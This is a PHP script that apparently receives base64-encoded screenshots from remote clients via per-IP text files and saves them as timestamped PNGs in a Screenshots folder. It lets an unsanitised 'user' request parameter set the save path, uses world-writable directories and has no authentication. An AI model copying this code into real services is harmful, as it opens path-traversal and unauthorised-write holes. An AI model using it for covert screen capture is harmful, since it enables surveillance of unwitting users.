<?php
$ip = $_SERVER['REMOTE_ADDR'];

if($_GET['o'] == 2){
	$myfile = fopen($ip.".txt", "r") or die("Unable to open file!");
	$text = fread($myfile,filesize($ip.".txt"));
	fclose($myfile);
	
	echo $text;
	// Obtain the original content (usually binary data)
	$bin = base64_decode($text);
	
	//
	// Load GD resource from binary data
	
	$im = imageCreateFromString($bin);
	
	//die("b");
	// Make sure that the GD library was able to load the image
	// This is important, because you should not miss corrupted or unsupported images
	if (!$im) {
	  die('Base64 value is not a valid image');
	}
	
	
	if(isset($_GET['user']))
		$ip = $_GET['user'];

	

	if (!file_exists("Screenshots/".$ip)) {
		mkdir($ip, 0777, true);
	}
	// Specify the location where you want to save the image
	$img_file = "Screenshots/".$ip."/".date("d-m-y_h-i-s").".png";

	// Save the GD resource as PNG in the best possible quality (no compression)
	// This will strip any metadata or invalid contents (including, the PHP backdoor)
	// To block any possible exploits, consider increasing the compression level
	imagepng($im, $img_file, 0);
	
	
	//Pulisce
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$myfile = fopen($ip.".txt", "w+") or die("Unable to open file!");
	fwrite($myfile, "");
	fclose($myfile);
}

if($_GET['o'] == 1){
	$myfile = fopen($ip.".txt", "w+") or die("Unable to open file!");
	fwrite($myfile, "");
	fclose($myfile);
}


?>